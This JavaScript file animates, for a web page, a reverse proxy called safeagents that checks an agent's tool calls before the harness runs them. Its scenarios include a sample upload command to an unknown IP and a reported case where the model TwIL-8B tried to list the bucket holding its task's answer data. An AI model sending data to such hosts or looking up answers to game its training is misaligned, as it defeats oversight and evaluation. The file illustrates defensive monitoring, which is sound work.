// safeagents as a reverse proxy: the harness talks to it as if it were the model server. It forwards each request,
// holds each tool call in the response until its three checks pass, and swaps a blocked call for a notice. The
// scenarios are real: the last one is the call TwIL-8B made in its smoke run (pi, step 0).
(() => {
  const root = document.getElementById("proxy-fx");
  if (!root) return;
  const NS = "http://www.w3.org/2000/svg";
  const svg = root.querySelector("svg");
  const caption = root.querySelector(".lora-fx__caption");
  const reduced = matchMedia("(prefers-reduced-motion: reduce)").matches;
  const SCENARIOS = [
    { call: "bash · ls -la src/ tests/", fails: null, out: "bash · ls -la src/ tests/",
      caption: "An ordinary call passes all three checks and reaches the harness byte for byte. Streaming adds no delay: only the tool call is held until it's complete." },
    { call: "bash · curl -X PUT 203.0.113.7/upload", fails: 1, out: "[safeagents] blocked call to `bash`: host `203.0.113.7` appears nowhere in the conversation",
      caption: "A host that appears nowhere in the conversation (the model's own earlier turns don't count) is blocked before any rule runs." },
    { call: "bash · list_bucket_tree('AdithyaSK/jupyter-agent-kaggle-all')", fails: 2, out: "[safeagents] blocked call to `bash`: atif-scan: smoldataenvs.answer_source (high)",
      caption: "From the TwIL-8B smoke run: listing the bucket a task's data came from matches our plugin's high-severity rule. The harness gets the notice, and the rollout scores 0." },
  ];
  const CHECKS = ["declared tool", "known host", "atif-scan + plugins"];
  const LEN = 8.2;  // seconds per scenario

  const el = (tag, attrs = {}, parent = svg, text) => {
    const e = document.createElementNS(NS, tag);
    for (const [k, v] of Object.entries(attrs)) if (v != null) e.setAttribute(k, v);
    if (text != null) e.textContent = text;
    parent.append(e);
    return e;
  };
  const box = (x, y, w, h, title, sub, stroke) => {
    el("rect", { x, y, width: w, height: h, rx: 10, fill: "var(--surface-1)", stroke: stroke || "var(--border)", "stroke-width": 1.5 });
    el("text", { x: x + w / 2, y: y + 26, "text-anchor": "middle", class: "lora-fx__chip-title", style: "font-size:15px" }, svg, title);
    el("text", { x: x + w / 2, y: y + 44, "text-anchor": "middle", class: "lora-fx__chip-sub" }, svg, sub);
  };

  // Static scene: harness, safeagents in the middle with its three checks, the model server
  box(30, 54, 180, 190, "harness", "pi · opencode · hermes");
  ["pi.svg", "opencode.png", "hermes.png"].forEach((logo, i) => el("image", { href: `logos/${logo}`, x: 60 + i * 44, y: 136, width: 32, height: 32 }));
  box(370, 54, 260, 190, "safeagents", "reverse proxy · in the trainer", "var(--accent)");
  box(790, 54, 180, 190, "model server", "vLLM · the policy");
  const lights = CHECKS.map((name, i) => {
    const y = 140 + i * 32;
    const g = el("g");
    const r = el("rect", { x: 390, y, width: 220, height: 26, rx: 13, fill: "var(--page)", stroke: "var(--border)", "stroke-width": 1.2 }, g);
    el("text", { x: 406, y: y + 17, class: "lora-fx__chip-sub", style: "font-size:11.5px" }, g, `${i + 1} · ${name}`);
    const mark = el("text", { x: 594, y: y + 18, "text-anchor": "end", style: "font: 700 13px var(--mono)" }, g, "");
    return { r, mark };
  });
  el("text", { x: 290, y: 96, "text-anchor": "middle", class: "lora-fx__hint" }, svg, "request");
  el("text", { x: 710, y: 96, "text-anchor": "middle", class: "lora-fx__hint" }, svg, "forwarded");
  el("text", { x: 710, y: 258, "text-anchor": "middle", class: "lora-fx__hint" }, svg, "response + tool call");
  el("text", { x: 290, y: 258, "text-anchor": "middle", class: "lora-fx__hint" }, svg, "checked call");
  for (const [x1, x2, y] of [[212, 368, 108], [632, 788, 108], [788, 632, 224], [368, 212, 224]]) {
    el("line", { x1, y1: y, x2, y2: y, stroke: "var(--border)", "stroke-width": 1.5, "stroke-dasharray": "4 4" });
  }
  const callChip = el("g");
  const outChip = el("g");
  const layer = el("g");

  let speed = 1.5, paused = false, onScreen = false, t = 0, last = performance.now();
  const span = (x, a, b) => Math.max(0, Math.min(1, (x - a) / (b - a)));
  const ease = (p) => (p < 0.5 ? 2 * p * p : 1 - (-2 * p + 2) ** 2 / 2);

  function chip(group, x, y, text, color, w) {
    group.replaceChildren();
    el("rect", { x: x - w / 2, y: y - 13, width: w, height: 26, rx: 7, fill: `color-mix(in oklab, ${color} 14%, var(--page))`, stroke: color, "stroke-width": 1.3 }, group);
    el("text", { x, y: y + 4.5, "text-anchor": "middle", style: `font: 11px var(--mono); fill: var(--text-primary)` }, group, text);
  }

  function draw() {
    const k = Math.floor(t / LEN) % SCENARIOS.length;
    const s = SCENARIOS[k];
    const u = t % LEN;
    caption.textContent = `${k + 1} / ${SCENARIOS.length} · ${s.caption}`;
    layer.replaceChildren();
    callChip.replaceChildren();
    outChip.replaceChildren();
    // Request: harness → safeagents → model server
    if (u < 2) {
      const p = ease(span(u, 0, 1)), q = ease(span(u, 1, 2));
      const x = u < 1 ? 212 + 156 * p : 632 + 156 * q;
      el("circle", { cx: x, cy: 108, r: 6, fill: "var(--text-muted)", stroke: "var(--surface-1)", "stroke-width": 2 }, layer);
    }
    // Response with a tool call: model server → safeagents
    if (u >= 2.4 && u < 3.6) {
      const p = ease(span(u, 2.4, 3.6));
      chip(callChip, 880 - 170 * p, 224, s.call.slice(0, 19) + "…", "var(--text-muted)", 150);
    } else if (u >= 3.6 && u < 6) {
      chip(callChip, 500, 120, s.call.length > 33 ? s.call.slice(0, 32) + "…" : s.call, "var(--text-muted)", 236);
    }
    // The three checks run in order, until one fails
    lights.forEach((l, i) => {
      const at = 3.8 + i * 0.5;
      const reached = s.fails === null || i <= s.fails;
      const on = u >= at && u < LEN - 0.4 && reached;
      const failed = on && s.fails === i;
      l.r.setAttribute("stroke", failed ? "var(--bad)" : on ? "var(--good)" : "var(--border)");
      l.r.setAttribute("fill", failed ? "color-mix(in oklab, var(--bad) 12%, var(--page))" : on ? "color-mix(in oklab, var(--good) 10%, var(--page))" : "var(--page)");
      l.mark.textContent = failed ? "✗" : on ? "✓" : "";
      l.mark.setAttribute("fill", failed ? "var(--bad)" : "var(--good)");
    });
    // The checked call: the original, or the notice in its place
    const tOut = 3.8 + ((s.fails ?? 2) + 1) * 0.5 + 0.3;
    if (u >= tOut) {
      const p = ease(span(u, tOut, tOut + 1));
      const color = s.fails === null ? "var(--good)" : "var(--bad)";
      const text = s.fails === null ? s.out.slice(0, 19) + "…" : "notice: blocked";
      chip(outChip, 290 - 170 * p, 224, text, color, 150);
      if (p >= 1) {
        el("text", { x: 120, y: 276, "text-anchor": "middle", style: `font: 600 12px var(--sans); fill: ${color}` }, layer,
          s.fails === null ? "the harness runs it" : "nothing runs · rollout scores 0");
        if (s.fails !== null) el("text", { x: 500, y: 300, "text-anchor": "middle", style: "font: 11.5px var(--mono); fill: var(--text-muted)" }, layer, s.out);
      }
    }
  }

  function frame(now) {
    const dt = Math.min(0.25, (now - last) / 1000);
    last = now;
    if (!paused && onScreen) t += dt * speed;
    draw();
    requestAnimationFrame(frame);
  }
  if (reduced) { t = 2 * LEN + 7.4; draw(); } else requestAnimationFrame(frame);
  const play = root.querySelector("[data-proxy-play]");
  play.addEventListener("click", () => { paused = !paused; play.textContent = paused ? "play" : "pause"; });
  root.querySelector("[data-proxy-replay]").addEventListener("click", () => { t = 0; });
  const input = root.querySelector("[data-proxy-speed]");
  const val = root.querySelector(".lora-fx__speed-val");
  input.addEventListener("input", () => { speed = +input.value; val.textContent = `${speed.toFixed(1)}×`; });
  new IntersectionObserver(([e]) => { onScreen = e.isIntersecting; }).observe(root);
})();
